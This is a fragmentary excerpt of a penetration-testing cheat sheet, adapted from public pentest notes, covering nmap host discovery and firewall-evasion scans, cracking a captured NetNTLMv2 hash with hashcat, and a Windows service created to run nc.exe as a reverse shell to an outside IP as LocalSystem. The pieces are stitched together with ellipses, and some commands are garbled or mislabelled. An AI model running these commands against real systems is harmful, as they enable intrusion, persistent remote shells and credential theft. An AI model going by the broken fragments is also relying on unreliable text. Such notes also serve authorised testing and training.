...
```bash
nmap -n -sn -PS22,135,443,445
```

### Ping Sweep \(ICMP only\):

```bash
nmap 10.1.1.1/24 (-PE instead of -sn) nmap -sn 
```
...
```bash
nmap -sS --source-port 53 -p 53 hping3 -S -s 53 -k -p 53
```
...
For more Active Directory commands look at the [PowerShell section]().
...
# resulting hash
adm::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:

# crack with hashcat
hashcat -m5600 'adm::WS01:1122334455667788:26872b3197acf1da493228ac1a54c67c:' -a 3 /usr/share/wordlists/rockyou.txt --force --potfile-disable
```
...
```csharp
# cmd
sc create UntrustedSrv binpath= "C:\nc.exe 10.11.0.245 443 -e C:\WINDOWS\System32\cmd.exe" obj= "LocalSystem" password= ""
...
This was inspired by and forked/adapted/updated from [Dostoevsky's Pentest Notes](https://github.com/dostoevskylabs/dostoevsky-pentest-notes) and [https://ired.team](https://ired.team)
